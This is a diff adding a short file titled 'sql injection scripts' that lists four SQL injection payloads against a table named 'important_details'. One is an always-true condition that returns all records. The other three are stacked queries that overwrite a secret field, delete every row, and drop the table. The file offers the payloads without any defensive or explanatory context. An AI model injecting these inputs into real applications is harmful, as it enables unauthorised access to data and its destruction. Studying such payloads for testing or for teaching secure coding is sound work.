@@ -1,0 +1,14 @@
+
+
+--------------sql injection scripts------------------
+
+1) anything' or 'x'='x (to access all records)
+
+2) '; UPDATE important_details SET secret_msg='afsf24fg';  (modifying database)
+
+3) '; DELETE FROM important_details; (delete entire records from table)
+
+4) '; DROP TABLE important_details; (to drop a table)
+
+
+
